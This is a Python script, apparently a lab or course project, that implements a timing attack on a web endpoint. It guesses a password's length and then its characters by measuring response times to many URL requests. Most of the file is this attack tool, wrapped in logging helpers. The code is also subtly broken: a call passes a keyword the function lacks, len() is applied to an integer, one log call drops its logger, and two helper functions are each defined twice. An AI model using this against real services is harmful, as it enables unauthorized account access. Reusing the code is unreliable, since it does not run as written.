import os
import logging as log
from time import time
import Configurations
import urllib.request
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor


# - - - - - - - - - -  LOG SECTION  - - - - - - - - - -

def create_folder_if_not_exists(folder_path: str) -> str:
    """
    This function create a given folder if it doesnt exists.
    :param folder_path: String. path to the given folder that need to be created.
    """
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)


def set_logger(result_path: str, class_name: str, log_filename=None) -> log.Logger:
    """
    The function initial logger to documenting the RGB colors of the given pixel.
    :param result_path.String. represent path to result folder.
    :param class_name. String. class name of the logger.
    :param log_filename.String. custom file name. if None is given, file name will be 'logfile_{current date and time}.log
    :return: logger instance.
    """

    class MyFormatter(log.Formatter):
        converter = datetime.fromtimestamp

        def formatTime(self, record, datefmt=None):
            ct = self.converter(record.created)
            if datefmt:
                s = ct.strftime(datefmt)
            else:
                t = ct.strftime("%Y-%m-%d %H:%M:%S")
                s = "%s,%03d" % (t, record.msecs)
            return s

    # Set up a specific logger with our desired output level
    if log_filename is None:
        log_filename = f'logfile_{get_current_date_and_time()}.log'

    create_folder_if_not_exists(result_path)
    create_folder_if_not_exists(os.path.join(result_path, class_name))

    log.basicConfig(filename=os.path.join(result_path, class_name, log_filename), filemode='w', level=log.INFO)
    logger = log.getLogger('MyLogger')
    formatter = MyFormatter(fmt='%(asctime)s %(message)s', datefmt='%Y-%m-%d,%H:%M:%S.%f')
    handler = log.StreamHandler()
    handler.setLevel(Configurations.log_level)
    handler.setFormatter(formatter)

    logger.addHandler(handler)

    return logger


def get_current_date_and_time() -> datetime:
    """
    This function return a current date and time in this representation DD-MM-YYYY HH:MM.
    :return: String, represent day and time.
    """
    return datetime.now().strftime('%d-%m-%Y %H-%M')


def get_session() -> None:
    """
    return session as a string.
    """
    if Configurations.session is None:
        Configurations.session = Configurations.running_folder_format
        create_folder_if_not_exists(os.path.join(Configurations.RESULTS_PATH, Configurations.session))

    return Configurations.session


def write_log(logger, message: str, log_level="info", print_to_console=Configurations.write_to_console) -> None:
    """
    Write the given message to the given og file at the specified log info.
    :param logger: Logger.
    :param message: String. message to write to log.
    :param log_level: String, represnt message log level.
    """
    if logger:
        if log_level == "info":
            logger.info(message)
        elif logger == "debug":
            logger.debug(message)
        else:
            pass

    if print_to_console:
        print(message)


def set_logger(result_path: str, class_name: str, log_filename: str = None) -> log.Logger:
    """
    The function initial logger to documenting the RGB colors of the given pixel.

    :param result_path.String. represent path to result folder.
    :param class_name. String. class name of the logger.
    :param log_filename.String. custom file name. if None is given, file name will be 'logfile_{current date and time}.log

    :return: logger instance.
    """
    # Set up a specific logger with our desired output level
    if log_filename is None:
        log_filename = f'logfile_{get_current_date_and_time()}.log'

    create_folder_if_not_exists(result_path)
    create_folder_if_not_exists(os.path.join(result_path, class_name))

    log.basicConfig(filename=os.path.join(result_path, class_name, log_filename), filemode='w', level=log.INFO)
    logger = log.getLogger('MyLogger')

    return logger


# - - - - - - - - - -  FILE SECTION  - - - - - - - - - -

def create_folder_if_not_exists(folder_path):
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)


# - - - - - - - - - -  PASSWORD SECTION  - - - - - - - - - -

def check_password_size(start_url: str = "", end_url: str = "",
                        password_size: int = Configurations.default_password_size, logger=None):
    """

    :param logger:
    :param start_url:
    :param end_url:
    :param password_size:
    :return:
    """
    # different_password_size = [i for i in range(1, password_size, 1)]  # generate different password length


    thread_pool = ThreadPoolExecutor(max_workers=password_size)


    time_dict = {i: 0 for i in range(1, password_size, 1)}  # will be using to hold the different_password_size-time connection

    future_results = []
    for i in range(password_size):
        url = f'{start_url}{"A" * i}{end_url}'
        future_results.append(thread_pool.submit(check_password_size_thread,url, Configurations.attempts, i, logger))

    thread_pool.shutdown(wait=True)

    for i in range(password_size):
        future_results[i] = future_results[i].result()

    password_length_index = future_results.index(max(future_results))
    write_log(logger, f"[check_password_size] password length is: {password_length_index}")

    return password_length_index

def check_password_size_thread(url: str, iterations: int, thread_number: int, logger):
    """

    :param url:
    :param iterations:
    :param thread_number:
    :param logger:
    :return:
    """
    toal_itearations_time = 0
    for i in range(iterations):
        # measure time
        start = time()
        urllib.request.urlopen(url)
        end = time()

        # insert to dict
        toal_itearations_time += end - start

        if i % 100 == 0:
            write_log(logger, f"[check_password_size_thread][thread number: {thread_number}][iteration number: {i}] result time: {toal_itearations_time}:")

        # if clear(time_dict):
        #     answer = check_answer(time_dict)
        #
        #     return answer

    return toal_itearations_time


def crack_password(size: int, start_url: str = "", end_url: str = "", logger=None):
    """

    :param size:
    :param logger:
    :return:
    """
    password = ""

    for i in range(int(len(size))):
        time_dict = {ch: 0 for ch in Configurations.characters}

        for i in range(Configurations.attempts):
            for character in Configurations.characters:
                # create url
                url = f"{start_url}{password}{character}{end_url}"

                # measure time
                start = time()
                urllib.request.urlopen(url)
                end = time()

                # insert to dict
                time_dict[character] += end - start

            write_log(logger, f"result time for password in length {i}:")

            for key, value in time_dict.items():
                write_log(f"key: {key}, time: {value}.")

        max_key = max(time_dict, key=time_dict.get)
        password += max_key

    write_log(logger, f"[crack password]: password found: '{password})'.")
    return password


def timing_attack(start_url: str = "", end_url: str = "",
                  password_size: int = Configurations.default_password_size) -> str:
    """
    This function get url and password size and return the password by using a time attack.

    :param start_url: str. first part of the url before password appear.
    :param end_url: str. last part of the url after password appear.
    :param password_size: Int. max size of the password that possible.

    :return: Int. password as a string. None if couldn't find any.
    """
    logger = set_logger(Configurations.result_path, "crack password")

    size = check_password_size(start_url, end_url, password_size, logger)

    if size is None:
        return None

    write_log(logger, f"password with maximal time is in length: {size}.")
    write_log(logger, f"starting to lookup password in size {size}.")

    plaintext_password = crack_password(password_size=size, start_url=start_url, end_url=end_url, logger=logger)

    if plaintext_password is None:
        return None

    write_log(logger, f"password is: {plaintext_password}.")

    return plaintext_password